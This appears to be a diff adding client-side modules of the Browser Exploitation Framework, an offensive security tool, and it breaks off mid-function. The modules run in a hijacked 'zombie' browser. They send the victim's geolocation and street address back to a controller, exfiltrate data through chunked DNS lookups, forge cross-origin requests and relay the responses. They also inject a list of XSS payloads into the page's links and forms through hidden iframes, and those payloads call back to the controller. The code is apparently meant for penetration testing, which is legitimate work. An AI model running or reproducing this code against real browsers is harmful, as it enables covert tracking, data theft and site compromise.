+
+beef.geolocation = {
+
+    /**
+     * Check if browser supports the geolocation API
+     * @return {boolean}
+     */
+    isGeolocationEnabled: function(){
+		return !!navigator.geolocation;
+    },
+
+    /** 
+     * Given latitude/longitude retrieves exact street position of the zombie
+     * @param command_url
+     * @param command_id
+     * @param latitude
+     * @param longitude
+     */
+    getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){
+
+        // fixes damned issues with jquery 1.5, like this one:
+        // http://bugs.jquery.com/ticket/8084
+        $j.ajaxSetup({
+            jsonp: null,
+            jsonpCallback: null
+        });
+
+        $j.ajax({
+            error: function(xhr, status, error){
+                beef.debug("[geolocation.js] openstreetmap error");
+                beef.net.send(command_url, command_id, "latitude=" + latitude
+                             + "&longitude=" + longitude
+                             + "&osm=UNAVAILABLE"
+                             + "&geoLocEnabled=True");
+                },
+            success: function(data, status, xhr){
+                beef.debug("[geolocation.js] openstreetmap success");
+                //var jsonResp = $j.parseJSON(data);
+
+                beef.net.send(command_url, command_id, "latitude=" + latitude
+                             + "&longitude=" + longitude
+//                             + "&osm=" + encodeURI(jsonResp.display_name)
+                              + "&osm=" + data.display_name
+                             + "&geoLocEnabled=True");
+                },
+            type: "get",
+	    dataType: "json",
+            url: "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" +
+                latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
+        });
+
+    },
+
+    /**
+     * Retrieve latitude/longitude using the geolocation API
+     * @param command_url
+     * @param command_id
+     */
+    getGeolocation: function (command_url, command_id){
+
+        if (!navigator.geolocation) {
+	        beef.net.send(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
+			return;
+		}
+        beef.debug("[geolocation.js] navigator.geolocation.getCurrentPosition");
+        navigator.geolocation.getCurrentPosition( //note: this is an async call
+			function(position){ // success
+				var latitude = position.coords.latitude;
+        		var longitude = position.coords.longitude;
+                beef.debug("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
+                beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);
+
+			}, function(error){ // failure
+                    beef.debug("[geolocation.js] error [%d] getting position", error.code);
+					switch(error.code) // Returns 0-3
+					{
+						case 0:
+			            	beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
+							return;
+						case 1:
+		            		beef.net.send(command_url, command_id, "latitude=PERMISSION_DENIED&longitude=PERMISSION_DENIED&geoLocEnabled=False");
+							return;
+						case 2:
+		            		beef.net.send(command_url, command_id, "latitude=POSITION_UNAVAILABLE&longitude=POSITION_UNAVAILABLE&geoLocEnabled=False");
+							return;
+						case 3:
+					   		beef.net.send(command_url, command_id, "latitude=TIMEOUT&longitude=TIMEOUT&geoLocEnabled=False");
+							return;
+					}
+            	beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
+			},
+			{enableHighAccuracy:true, maximumAge:30000, timeout:27000}
+		);
+    }
+}
+
+
+beef.regCmp('beef.geolocation');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * 
+ * request object structure:
+ * + msgId: {Integer} Unique message ID for the request.
+ * + domain: {String} Remote domain to retrieve the data.
+ * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
+ * + callback: {Function} Callback function to receive the number of requests sent.
+ * @namespace beef.net.dns
+ */
+
+beef.net.dns = {
+
+	handler: "dns",
+    /**
+     * 
+     * @param msgId 
+     * @param data 
+     * @param domain 
+     * @param callback 
+     */
+	send: function(msgId, data, domain, callback) {
+
+        var encode_data = function(str) {
+            var result="";
+            for(i=0;i<str.length;++i) {
+                result+=str.charCodeAt(i).toString(16).toUpperCase();
+            }
+            return result;
+        };
+
+        var encodedData = encodeURI(encode_data(data));
+
+        beef.debug(encodedData);
+        beef.debug("_encodedData_ length: " + encodedData.length);
+
+        // limitations to DNS according to RFC 1035:
+        // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
+        // o Domain names are limited to 255 characters in length (including dots)
+        // o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
+        // o Subdomains are limited to 63 characters in length (including the trailing dot)
+
+        // DNS request structure:
+        // COMMAND_ID.SEQ_NUM.SEQ_TOT.DATA.DOMAIN
+      //max_length: 3.   3   .   3   . 63 . x
+
+        // only max_data_segment_length is currently used to split data into chunks. and only 1 chunk is used per request.
+        // for optimal performance, use the following vars and use the whole available space (which needs changes server-side too)
+        var reserved_seq_length = 3 + 3 + 3 + 3; // consider also 3 dots
+        var max_domain_length = 255 - reserved_seq_length; //leave some space for sequence numbers
+        var max_data_segment_length = 63; // by RFC
+
+        beef.debug("max_data_segment_length: " + max_data_segment_length);
+
+        var dom = document.createElement('b');
+
+        String.prototype.chunk = function(n) {
+            if (typeof n=='undefined') n=100;
+            return this.match(RegExp('.{1,'+n+'}','g'));
+        };
+
+        var sendQuery = function(query) {
+            var img = new Image;
+            //img.src = "http://"+query;
+            img.src = beef.net.httpproto + "://" + query; // prevents issues with mixed content
+            img.onload = function() { dom.removeChild(this); }
+            img.onerror = function() { dom.removeChild(this); }
+            dom.appendChild(img);
+
+            //experimental
+            //setTimeout(function(){dom.removeChild(img)},1000);
+        };
+
+        var segments = encodedData.chunk(max_data_segment_length);
+
+        var ident = "0xb3"; //see extensions/dns/dns.rb, useful to explicitly mark the DNS request as a tunnel request
+
+        beef.debug(segments.length);
+
+        for (var seq=1; seq<=segments.length; seq++) {
+            sendQuery(ident + msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
+        }
+
+		// callback - returns the number of queries sent
+		if (!!callback) callback(segments.length);
+
+	}
+
+};
+
+beef.regCmp('beef.net.dns');
+
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * beef.net.connection - wraps Mozilla's Network Information API
+ * https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation
+ * https://developer.mozilla.org/en-US/docs/Web/API/Navigator/connection
+ * @namespace beef.net.connection
+ */
+beef.net.connection = {
+
+  /**
+   * Returns the connection type. https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/type
+   * @example beef.net.connection.type()
+   * @return {String} connection type or 'unknown'.
+   */
+  type: function () {
+    try {
+      var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      var type = connection.type;
+      if (/^[a-z]+$/.test(type)) return type; else return 'unknown';
+    } catch(e) {
+      beef.debug("Error retrieving connection type: " + e.message);
+      return 'unknown';
+    }
+  },
+
+  /** 
+   * Returns the maximum downlink speed of the connection. https://developer.mozilla.org/en-US/docs/Web/API/NetworkInformation/downlinkMax
+   * @example beef.net.connection.downlinkMax()
+   * @return {String} downlink max or 'unknown'.
+   */
+  downlinkMax: function () {
+    try {
+      var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      var max = connection.downlinkMax;
+      if (max) return max; else return 'unknown';
+    } catch(e) {
+      beef.debug("Error retrieving connection downlink max: " + e.message);
+      return 'unknown';
+    }
+  }
+
+};
+
+beef.regCmp('beef.net.connection');
+
+
+
+/**
+ * @namespace beef.net.cors
+ */
+
+beef.net.cors = {
+
+  handler: "cors",
+
+    /**
+     * Response Object - used in the beef.net.request callback
+     */
+    response:function () {
+        this.status  = null;      // 500, 404, 200, 302, etc
+        this.headers = null;      // full response headers
+        this.body    = null;      // full response body
+    },
+
+    /**
+     * Make a cross-origin request using CORS
+     *
+     * @param method {String} HTTP verb ('GET', 'POST', 'DELETE', etc.)
+     * @param url {String} url
+     * @param data {String} request body
+     * @param timeout {Integer} request timeout in milliseconds
+     * @param callback {Function} function to callback on completion
+     */
+    request: function(method, url, data, timeout, callback) {
+
+    var xhr;
+    var response = new this.response;
+
+    if (XMLHttpRequest) {
+        xhr = new XMLHttpRequest();
+
+        if ('withCredentials' in xhr) {
+            xhr.open(method, url, true);
+            xhr.timeout = parseInt(timeout, 10);
+            xhr.onerror = function() {
+            };
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    response.headers = this.getAllResponseHeaders()
+                    response.body    = this.responseText;
+                    response.status  = this.status;
+                    if (!!callback) {
+                        if (!!response) {
+                            callback(response);
+                        } else { 
+                            callback('ERROR: No Response. CORS requests may be denied for this resource.')
+                        }
+                    }
+                }
+            };
+            xhr.send(data);
+        }
+    } else if (typeof XDomainRequest != "undefined") {
+        xhr = new XDomainRequest();
+        xhr.open(method, url);
+        xhr.onerror = function() {
+        };
+        xhr.onload = function() {
+            response.headers = this.getAllResponseHeaders()
+            response.body    = this.responseText;
+            response.status  = this.status;
+            if (!!callback) {
+                if (!!response) {
+                    callback(response);
+                } else {
+                    callback('ERROR: No Response. CORS requests may be denied for this resource.')
+                }
+            }
+        };
+        xhr.send(data);
+    } else {
+        if (!!callback) callback('ERROR: Not Supported. CORS is not supported by the browser. The request was not sent.');
+    }
+
+    }
+
+};
+
+beef.regCmp('beef.net.cors');
+
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * request object structure:
+ * + method: {String} HTTP method to use (GET or POST).
+ * + host: {String} hostname
+ * + query_string: {String} The query string is a part of the URL which is passed to the program.
+ * + uri: {String} The URI syntax consists of a URI scheme name.
+ * + headers: {Array} contain the operating parameters of the HTTP request. 
+ * @namespace beef.net.requester
+ */
+beef.net.requester = {
+	
+	handler: "requester",
+	/**
+     * 
+     * @param {array} requests_array 
+     */
+	send: function(requests_array) {
+        for(var i=0; i<requests_array.length; i++){
+            request = requests_array[i];
+            if (request.proto == 'https') var scheme = 'https'; else var scheme = 'http';
+            beef.debug('[Requester] ' + request.method + ' ' + scheme + '://' + request.host + ':' + request.port + request.uri + ' - Data: ' + request.data);
+            beef.net.forge_request(scheme, request.method, request.host, request.port, request.uri, null, request.headers, request.data, 10, null, request.allowCrossOrigin, request.id,
+                                       function(res, requestid) { beef.net.send('/requester', requestid, {
+                                           response_data: res.response_body,
+                                           response_status_code: res.status_code,
+                                           response_status_text: res.status_text,
+					                       response_port_status: res.port_status,
+                                           response_headers: res.headers});
+                                       }
+                                 );
+        }
+    }
+};
+
+beef.regCmp('beef.net.requester');
+
+
+/*
+ * XSS Rays
+ * Legal bit:
+ * Do not remove this notice.
+ * Copyright (c) 2009 by Gareth Heyes
+ * Programmed for Microsoft
+ * gareth --at-- businessinfo -dot- co |dot| uk
+ * Version 0.5.5
+ *
+ * This license governs use of the accompanying software. If you use the software, you
+ * accept this license. If you do not accept the license, do not use the software.
+ * 1. Definitions
+ * The terms "reproduce," "reproduction," "derivative works," and "distribution" have the
+ * same meaning here as under U.S. copyright law.
+ * A "contribution" is the original software, or any additions or changes to the software.
+ * A "contributor" is any person that distributes its contribution under this license.
+ * "Licensed patents" are a contributor's patent claims that read directly on its contribution.
+ * 2. Grant of Rights
+ * (A) Copyright Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free copyright license to reproduce its contribution, prepare derivative works of its contribution, and distribute its contribution or any derivative works that you create.
+ * (B) Patent Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free license under its licensed patents to make, have made, use, sell, offer for sale, import, and/or otherwise dispose of its contribution in the software or derivative works of the contribution in the software.
+ * 3. Conditions and Limitations
+ * (A) No Trademark License- This license does not grant you rights to use any contributors' name, logo, or trademarks.
+ * (B) If you bring a patent claim against any contributor over patents that you claim are infringed by the software, your patent license from such contributor to the software ends automatically.
+ * (C) If you distribute any portion of the software, you must retain all copyright, patent, trademark, and attribution notices that are present in the software.
+ * (D) If you distribute any portion of the software in source code form, you may do so only under this license by including a complete copy of this license with your distribution. If you distribute any portion of the software in compiled or object code form, you may only do so under a license that complies with this license.
+ * (E) The software is licensed "as-is." You bear the risk of using it. The contributors give no express warranties, guarantees or conditions. You may have additional consumer rights under your local laws which this license cannot change. To the extent permitted under your local laws, the contributors exclude the implied warranties of merchantability, fitness for a particular purpose and non-infringement.
+ */
+
+/**
+ * XssRays 0.5.5 ported to BeEF by Michele "antisnatchor" Orru'
+ * The XSS detection mechanisms has been rewritten from scratch: instead of using the location hash trick (that doesn't work anymore),
+ * if the vulnerability is triggered the JS code vector will contact back BeEF.
+ * Other aspects of the original code have been simplified and improved.
+ * @namespace beef.net.xssrays
+ */
+beef.net.xssrays = {
+    handler: "xssrays",
+    completed:0,
+    totalConnections:0,
+
+    // BeEF variables
+    xssraysScanId : 0,
+    hookedBrowserSession: "",
+    beefRayUrl: "",
+    // the following variables are overridden via BeEF, in the Scan Config XssRays sub-tab. 
+    crossDomain: false,
+    cleanUpTimeout:5000,
+
+    //browser-specific attack vectors available strings: ALL, FF, IE, S, C, O
+    vectors: [
+
+				  {input:"\',XSS,\'", name: 'Standard DOM based injection single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'",XSS,"', name: 'Standard DOM based injection double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\'"><script>XSS<\/script>', name: 'Standard script injection', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\'"><body onload="XSS">', name: 'body onload', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%27%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%22%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'%%32%35%%33%32%%33%32%%32%35%%33%33%%34%35%%32%35%%33%33%%34%33%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35XSS%%32%35%%33%33%%34%33%%32%35%%33%32%%34%36%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35', name: 'double nibble url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true},
+				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
+  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
+  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
+    ],
+    uniqueID: 0,
+    rays: [],
+    stack: [],
+
+    /**
+     * return true is the attack vector can be launched to the current browser type.
+     * @param {array} vector_array_index 
+     */
+    checkBrowser:function(vector_array_index){
+        var result = false;
+        var browser_id = this.vectors[vector_array_index].browser;
+        switch (browser_id){
+        case "ALL":
+            result = true;
+            break;
+        case "FF":
+            if(beef.browser.isFF())result=true;
+            break;
+        case "IE":
+            if(beef.browser.isIE())result=true;
+            break;
+        case "C":
+            if(beef.browser.isC())result=true;
+            break;
+        case "S":
+            if(beef.browser.isS())result=true;
+            break;
+        case "O":
+            if(beef.browser.isO())result=true;
+            break;
+        default : result = false;
+        }
+        beef.debug("==== browser_id ==== [" + browser_id + "], result [" + result + "]");
+        return result;
+    },
+
+    /**
+     * main function, where all starts :-)
+     * @param xssraysScanId 
+     * @param hookedBrowserSession 
+     * @param beefUrl 
+     * @param crossDomain 
+     * @param timeout 
+     */
+    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout) {
+
+        this.xssraysScanId = xssraysScanId;
+        this.hookedBrowserSession = hookedBrowserSession;
+        this.beefRayUrl = beefUrl + '/' + this.handler;
+        beef.debug("Using [" + this.beefRayUrl  + "] handler to contact back BeEF");
+        this.crossDomain = crossDomain;
+        this.cleanUpTimeout = timeout;
+
+        this.scan();
+        beef.debug("Starting scan");
+        this.runJobs();
+    },
+    complete:function() {
+        if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
+            beef.debug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
+            $j.get(this.beefRayUrl, { hbsess: this.hookedBrowserSession, raysid: this.xssraysScanId, action: "finish"} );
+        } else {
+            this.getNextJob();
+        }
+    },
+    getNextJob:function() {
+        var that = this;
+        beef.debug("getNextJob - this.stack.length [" + this.stack.length + "]");
+        if (this.stack.length > 0) {
+            var func = that.stack.shift();
+            if (func) {
+                that.completed++;
+                func.call(that);
+            }
+        }else{ //nothing else to scan
+            this.complete();
+        }
+    },
+    scan:function() {
+        this.scanLinks();
+        this.scanForms();
+    },
+    scanPaths:function() {
+        this.xss({type:'path'});
+        return this;
+    },
+    scanForms: function() {
+        this.xss({type:'form'});
+        return this;
+    },
+    scanLinks: function() { //TODO: add depth crawling for links that are in the same domain
+        beef.debug("scanLinks, document.links.length [" + document.links.length + "]");
+        for (var i = 0; i < document.links.length; i++) {
+            var url = document.links[i];
+
+            if ((url.hostname.toString() === location.hostname.toString() || this.crossDomain) && (location.protocol === 'http:' || location.protocol === 'https:')) {
+                beef.debug("Starting scanning URL [" + url + "]\n url.href => " + url.href +
+                    "\n url.pathname => " + url.pathname + "\n" +
+                    "url.search => " + url.search + "\n");
+                this.xss({href:url.href, pathname:url.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,
+                    search:url.search, type: 'url'});//scan each link & param
+            } else {
+                beef.debug('Scan is not Cross-origin.  URLS\nurl :' + url.hostname.toString());
+                beef.debug('\nlocation :' + location.hostname.toString());
+            }
+        }
+        if (location.search.length > 0) {
+            this.xss({pathname:location.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,search:location.search, type: 'url'});//scan originating url
+        }
+        return this;
+    },
+    xss:function(target) {
+        switch (target.type) {
+            case "url":
+                if (target.search.length > 0) {
+                    target.search = target.search.slice(1);
+                    target.search = target.search.split(/&|&amp;/);
+
+                    if(beef.browser.isIE() && target.pathname.charAt(0) != "/"){ //the damn IE doesn't contain the forward slash in pathname
+                       var pathname = "/" + target.pathname;
+                    }else{
+                        var pathname = target.pathname;
+                    }
+
+                    var params = {};
+                    for (var i = 0; i < target.search.length; i++) {
+                        target.search[i] = target.search[i].split('=');
+                        params[target.search[i][0]] = target.search[i][1];
+                    }
+                    for (var i = 0; i < this.vectors.length; i++) {
+                        // skip the current vector if it's not compatible with the hooked browser
+                        if (!this.checkBrowser(i)){
+                            beef.debug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
+                            continue;
+                        }
+                        if (!this.vectors[i].url) {
+                            continue;
+                        }
+                        if (this.vectors[i].url) {
+                            if (target.port == null || target.port == "") {
+                                beef.debug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], params, true);//params
+                            } else {
+                                beef.debug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], params, true);//params
+                            }
+                        }
+                        if (this.vectors[i].path) {
+                            if (target.port == null || target.port == "") {
+                                beef.debug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], null, true);//paths
+                            } else {
+                                beef.debug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
+                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], null, true);//paths
+                            }
+                        }
+                    }
+                }
+                break;
+            case "form":
+                var params = {};
+                var paramsstring = "";
+                for (var i = 0; i < document.forms.length; i++) {
+                    var action = document.forms[i].action || document.location;
+                    var method = document.forms[i].method.toUpperCase() === 'POST' ?
+                        'POST' :
+                        'GET';
+
+                    for (var j = 0; j < document.forms[i].elements.length; j++) {
+                        params[document.forms[i].elements[j].name] = document.forms[i].elements[j].value || 1;
+                    }
+                    for (var k = 0; k < this.vectors.length; k++) {
+
+                        // skip the current vector if it's not compatible with the hooked browser
+                        if (!this.checkBrowser(k)){
+                            beef.debug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
+                            continue;
+                        }
+                        if (!this.vectors[k].form) {
+                            continue;
+                        }
+                        if (!this.crossDomain && (this.host(action).toString() != this.host(location.toString()))) {
+                            beef.debug('Scan is not Cross-origin. FormPost\naction :' + this.host(action).toString());
+                            beef.debug('location :' + this.host(location));
+                            continue;
+                        }
+                        if (this.vectors[k].form) {
+                            if (method === 'GET') {
+                                beef.debug("Starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
+                                this.run(action, method, this.vectors[k], params, true);//params
+                            }
+                            else {
+                                beef.debug("Starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
+                                this.run(action, method, this.vectors[k], params, false);//params
+                            }
+                        }
+                        if (this.vectors[k].path) {
+                            beef.debug("Starting XSS on FORM action URI PATH of [" + action + "], ");
+                            this.run(action, 'GET', this.vectors[k], null, true);//paths
+                        }
+                    }
+                }
+                break;
+        }
+    },
+    host: function(url) {
+        var host = url;
+        host = /^https?:[\/]{2}[^\/]+/.test(url.toString())
+            ? url.toString().match(/^https?:[\/]{2}[^\/]+/)
+            : /(?:^[^a-zA-Z0-9\/]|^[a-zA-Z0-9]+[:]+)/.test(url.toString())
+            ? ''
+            : location.hostname.toString();
+        return host;
+    },
+    fileName: function(url) {
+        return url.match(/(?:^[^\/]|^https?:[\/]{2}|^[\/]+)[^?]+/) || '';
+    },
+
+    urlEncode: function(str) {
+        str = str.toString();
+        str = str.replace(/"/g, '%22');
+        str = str.replace(/&/g, '%26');
+        str = str.replace(/\+/g, '%2b');
+        return str;
+    },
+
+    /**
+     * this is the main core function with the detection mechanisms...
+     * @param url 
+     * @param method 
+     * @param vector 
+     * @param params 
+     * @param urlencode 
+     */
+    run: function(url, method, vector, params, urlencode) {
+        this.stack.push(function() {
+
+            //check if the URL end with / . In this case remove the last /, as it will be added later.
+            // this check is needed only when checking for URI path injections
+            if(url[url.length - 1] == "/" && params == null){
+               url = url.substring(0, url.length - 2);
+               beef.debug("Remove last / from url. New url [" + url + "]");
+            }
+
+            beef.net.xssrays.uniqueID++;
+            beef.debug('Processing vector [' + vector.name + "], URL [" + url + "]");
+            var poc = '';
+            var pocurl = url;
+            var exploit = '';
+            var action = url;
+
+
+            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
+            var ray = this.rays[beef.net.xssrays.uniqueID];
+
+            var paramsPos = 0;
+            if (params != null) {
+                /*
+                 * ++++++++++ check for XSS in URI parameters (GET) ++++++++++
+                 */
+                for (var i in params) {
+                    if (params.hasOwnProperty(i)) {
+
+                        if (!/[?]/.test(url)) {
+                            url += '?';
+                            pocurl += '?';
+                        }
+
+                        poc = vector.input.replace(/XSS/g, "alert(1)");
+                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc) + '&';
+
+                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
+                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
+
+                        beefCallback = "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
+
+                        exploit = vector.input.replace(/XSS/g, beefCallback);
+
+                        if(beef.browser.isC() || beef.browser.isS()){ //we will base64 the whole uri later
+                            url += i + '=' + exploit + '&';
+                        }else{
+                            url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
+                        }
+
+                        paramsPos++;
+                    }
+                }
+            } else {
+                /*
+                 * ++++++++++ check for XSS in URI path (GET) ++++++++++
+                 */
+                var filename = beef.net.xssrays.fileName(url);
+
+                poc = vector.input.replace(/XSS/g, "alert(1)");
+                pocurl = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
+
+
+                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
+                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
+
+                beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                    + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
+
+                exploit = vector.input.replace(/XSS/g, beefCallback);
+
+                //TODO: if the url is something like example.com/?param=1 then a second slash will be added, like example.com//<xss>.
+                //TODO: this need to checked and the slash shouldn't be added in this particular case
+                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
+            }
+            /*
+             * ++++++++++ create the iFrame that will contain the attack vector ++++++++++
+             */
+            if(beef.browser.isIE()){
+                try {
+                    var iframe = document.createElement('<iframe name="ray'+Math.random().toString() +'">');
+                } catch (e) {
+                    var iframe = document.createElement('iframe');
+                    iframe.name = 'ray' + Math.random().toString();
+                }
+            }else{
+                var iframe = document.createElement('iframe');
+                iframe.name = 'ray' + Math.random().toString();
+            }
+            iframe.style.display = 'none';
+            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
+            iframe.time = beef.net.xssrays.timestamp();
+
+            if (method === 'GET') {
+                if(beef.browser.isC() || beef.browser.isS()){
+                    var datauri = btoa(url);
+                    iframe.src = "data:text/html;base64," + datauri;
+                }else{
+                    iframe.src = url;
+                }
+                document.body.appendChild(iframe);
+                beef.debug("Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
+            } else if (method === 'POST') {
+                /*
+                 * ++++++++++ check for XSS in body parameters (POST) ++++++++++
+                 */
+                var form = '<form action="' + beef.net.xssrays.escape(action) + '" method="post" id="frm">';
+                poc = '';
+                pocurl = action + "?";
+                paramsPos = 0;
+
+                beef.debug("Form action [" + action + "]");
+                for (var i in params) {
+                    if (params.hasOwnProperty(i)) {
+
+                        poc = vector.input.replace(/XSS/g, "alert(1)");
+                        poc = poc.replace(/<\/script>/g, "<\/scr\"+\"ipt>");
+                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc); // + '&';
+
+                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
+                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
+
+                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
+
+                        exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
+                        form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
+                        beef.debug("form param[" + i + "] = " + params[i].toString());
+
+                        paramsPos++;
+                    }
+                }
+                form += '<\/form>';
+                document.body.appendChild(iframe);
+                beef.debug("Creating form [" + form + "]");
+                iframe.contentWindow.document.writeln(form);
+                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
+                beef.debug("Submitting form");
+            }
+
+        });
+    },
+
+    /**
+     * run the jobs (run functions added to the stack), and clean the shit (iframes) from the DOM after a timeout value
+     */
+    runJobs: function() {
+        var that = this;
